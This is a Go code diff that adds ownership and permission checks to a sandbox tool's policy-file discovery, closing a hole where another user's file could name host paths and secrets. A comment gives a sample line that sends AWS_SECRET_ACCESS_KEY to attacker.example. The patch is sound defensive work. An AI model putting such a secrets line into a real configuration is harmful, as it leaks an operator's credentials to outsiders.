@@ -14,6 +14,7 @@ import (
 	"fmt"
 	"math"
 	"os"
+	"os/user"
 	"path/filepath"
 	"strconv"
 	"strings"
@@ -114,6 +115,10 @@ type Sessions struct {
 
 // Find walks up from a directory looking for a policy file, so running kelyfos
 // from a subdirectory of a project behaves the way git does.
+//
+// Finding a file is not trusting it. Trust decides that, and every caller of
+// this function has to ask it before Load — the walk is what makes a file
+// somebody else left in a parent directory reachable at all (P7-17/F21).
 func Find(start string) (string, bool) {
 	dir, err := filepath.Abs(start)
 	if err != nil {
@@ -556,3 +561,144 @@ func parsePercent(value, where string) (int, error) {
 
 // ParsePercent exposes the same grammar to the --cpu-quota flag.
 func ParsePercent(v string) (int, error) { return parsePercent(v, "--cpu-quota") }
+
+// Trust decides whether a policy file may be believed at all (P7-17/F21).
+//
+// Find walks from the working directory to / and takes the first kelyfos.toml
+// it meets. That file then names an absolute workspace — packed into the guest
+// and, on shutdown, synced back over that host directory — an absolute
+// plugin.path, packed read-only into the guest so its contents become readable
+// inside the sandbox, an allow list, and
+// secrets = ["AWS_SECRET_ACCESS_KEY@attacker.example"], which reads the
+// operator's environment and attaches the value to requests to a domain the
+// same file allows. Until this existed, a file another local user left at
+// /tmp/kelyfos.toml got all of that on a plain `kelyfos run` beneath it, and a
+// file anybody could write got it whether or not they had left it there.
+//
+// This is the shape git fixed with safe.directory and sudo fixed with the
+// ownership rule on sudoers. Two conditions, both refusals rather than
+// warnings, because a warning about a file that has already been read is a
+// warning about something that already happened:
+//
+//   - The file must not be group- or world-writable. Applied to a file named
+//     with --policy as well as to a discovered one: naming a file does not make
+//     a file anybody can rewrite safe.
+//   - A DISCOVERED file must be owned by the invoking user, or by root. Not
+//     applied to --policy, because an operator who names a file has made the
+//     decision this rule exists to ask for.
+//
+// A symlink is checked on both ends: a link the invoking user does not own
+// points wherever its owner chooses, whatever the target's own mode says.
+//
+// A file that is not there is not an error here. The callers' own "no policy
+// at all" and "--policy names nothing" paths already say the right thing, and
+// two messages for one condition is worse than none.
+func Trust(path string, discovered bool) error {
+	if li, err := os.Lstat(path); err == nil && li.Mode()&os.ModeSymlink != 0 {
+		if err := trustOwner(path, li, discovered, "the symlink at"); err != nil {
+			return err
+		}
+	}
+	fi, err := os.Stat(path)
+	if err != nil {
+		return nil
+	}
+	if why := writableByOthers(fi); why != "" {
+		return fmt.Errorf("%s is mode %04o, so %s.\n"+
+			"    This file decides which host directory is packed into the guest and synced back\n"+
+			"    over, which host directories a plugin exposes to it, which domains it may reach,\n"+
+			"    and which of your environment variables are attached to requests. A file somebody\n"+
+			"    else can edit does not get to decide those.\n"+
+			"    Fix it with: chmod go-w %s", path, fi.Mode().Perm(), why, path)
+	}
+	return trustOwner(path, fi, discovered, "")
+}
+
+// writableByOthers says why a mode lets somebody other than the file's owner
+// rewrite it, or "" when it does not.
+//
+// World-writable is unconditional. Group-writable is not, and getting that
+// wrong would have been worse than the finding: this project's own development
+// VM runs umask 0002, so `cat > kelyfos.toml` produces mode 0664 — and refusing
+// that would have refused every cookbook recipe and every acceptance script in
+// the repository, on the machine they are run on.
+//
+// A umask of 002 is safe precisely because of the convention it presupposes:
+// the user-private group, where every account's primary group has one member
+// and is named after the account. Under that convention the group bit grants
+// nobody anything the owner bit did not already grant, and refusing it would
+// be refusing "writable by you". Where the file's group is NOT that private
+// group it is a genuine widening — a shared `staff`, `users` or project group
+// — and it is refused.
+//
+// The test for the private group is deliberately both halves — the gid must be
+// the invoking user's primary gid AND the group's name must be the user's own
+// name. A primary group of `staff` passes the first and fails the second, which
+// is the case that matters.
+func writableByOthers(fi os.FileInfo) string {
+	m := fi.Mode().Perm()
+	if m&0o002 != 0 {
+		return "every user on this machine can rewrite it"
+	}
+	if m&0o020 == 0 {
+		return ""
+	}
+	gid, ok := fileGID(fi)
+	if !ok {
+		return "its group can rewrite it, and this platform will not say which group that is"
+	}
+	if isPrivateGroup(gid) {
+		return ""
+	}
+	name := strconv.Itoa(gid)
+	if g, err := user.LookupGroupId(name); err == nil {
+		name = g.Name
+	}
+	return "everyone in the group " + name + " can rewrite it"
+}
+
+// isPrivateGroup reports whether gid is the invoking user's own user-private
+// group: their primary gid, named after them. Anything else is a group with
+// other people in it, as far as this check is willing to assume.
+func isPrivateGroup(gid int) bool {
+	if gid != os.Getgid() {
+		return false
+	}
+	u, err := user.Current()
+	if err != nil {
+		return false
+	}
+	g, err := user.LookupGroupId(u.Gid)
+	if err != nil {
+		return false
+	}
+	return g.Name == u.Username
+}
+
+// trustOwner is the uid half, shared by the symlink and the file it names.
+func trustOwner(path string, fi os.FileInfo, discovered bool, what string) error {
+	if !discovered {
+		return nil
+	}
+	uid, ok := fileUID(fi)
+	if !ok {
+		// No ownership information at all. Fail closed: the whole point of
+		// this check is that a policy file nobody vouched for does not get to
+		// name host paths, and "the platform would not say" is not vouching.
+		return fmt.Errorf("cannot tell who owns %s, so it is not trusted to name host paths.\n"+
+			"    Name it explicitly with --policy if it is yours", path)
+	}
+	me := os.Getuid()
+	if uid == me || uid == 0 {
+		return nil
+	}
+	prefix := "the policy file"
+	if what != "" {
+		prefix = what
+	}
+	return fmt.Errorf("%s %s is owned by uid %d, and you are uid %d.\n"+
+		"    kelyfos found it by walking up from this directory, and a file somebody else\n"+
+		"    left in a parent directory does not get to name your host paths, your domains\n"+
+		"    or your environment variables.\n"+
+		"    Name it explicitly with --policy if you meant to use it", prefix, path, uid, me)
+}
